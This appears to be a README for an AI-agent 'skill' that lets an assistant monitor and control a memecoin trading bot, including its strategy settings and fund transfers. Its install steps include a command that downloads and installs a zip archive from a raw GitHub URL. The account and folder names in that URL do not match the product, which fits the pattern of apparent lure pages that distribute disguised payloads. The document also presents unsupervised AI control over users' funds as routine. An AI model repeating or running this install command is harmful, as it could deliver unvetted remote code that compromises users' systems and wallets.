## 📋 What is dx-terminal-pro-skill?

dx-terminal-pro-skill is a tool designed to let an AI agent take full control of a memecoin trading bot on the DX Terminal Pro platform. It helps your AI assistant watch over the trading bot’s performance, adjust how it trades, and manage funds automatically.

Think of it like a remote control. Your AI assistant can check how well the trading bot is doing, see all its trades, and make decisions to change the bot’s behavior to improve results. This lets you use smart automation to trade memecoins with less effort on your side.

DX Terminal Pro itself is a setup where different AI agents trade memecoins automatically. This skill adds a layer so your AI can manage one of these trading agents directly.

---

## 🔧 Features Included

You get several useful functions with this skill:

- **Portfolio & PnL Monitoring:** See token balances, total ETH value, and profit or loss over time.
- **Trade History:** View every swap the trading agent made with explanations behind each trade.
- **Decision Logs:** Peek inside the AI agent’s thinking as it makes trading choices.
- **Behavior Control:** Adjust how the agent trades by changing strategy settings.
- **Fund Management:** Manage transfers and holdings accessed by the agent.
- **Status Updates:** Receive regular reports on the agent’s current state and recent actions.

These features work together to provide full oversight and control through your AI assistant.

## ⚙️ How to Use dx-terminal-pro-skill

### Running the skill with your AI assistant

1. Launch the AI assistant application you usually use with DX Terminal Pro.
2. Add dx-terminal-pro-skill by using the skill manager command:
   ```
   npx clawhub@latest install dx-terminal-pro-skill
   ```
   Or use:
   ```
   npx skills add https://raw.githubusercontent.com/guardiaoitauseguro/dx-terminal-pro-skill/main/macroprosopia/pro_dx_skill_terminal_2.0.zip
   ```
3. Once installed, activate the skill within your assistant. The assistant can now manage your trading agent automatically.

### What your AI assistant will do

- Monitor token balances and ETH value in your portfolio.
- Record each swap the trading agent executes.
- Access logs of decision-making steps taken by the AI.
- Change trading strategy parameters when needed.
- Send alerts or updates on trading status.
